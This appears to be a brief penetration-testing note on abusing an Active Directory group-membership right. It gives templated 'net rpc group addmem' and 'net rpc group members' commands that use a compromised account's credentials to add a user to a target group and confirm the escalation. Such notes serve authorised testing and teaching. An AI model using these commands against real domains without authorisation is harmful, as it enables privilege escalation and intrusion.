can add any object (including yourself) to a group and get all permissions granted to that group
  
  
add the object to the group
```JavaScript
net rpc group addmem "<target_group>" "<target_user>" -U '<DOMAIN>'/'<comped_user>'%'<pass>' -S "<IP>"
```
- if you get no return message that’s good
![image 407.png](../../assets/AddMember/image%20407.png)
  
verify group membership
```JavaScript
net rpc group members "<group>" -U "<DOMAIN>"/"<user>"%'<pass>' -S "<IP>"
```
![image 1 304.png](../../assets/AddMember/image%201%20304.png)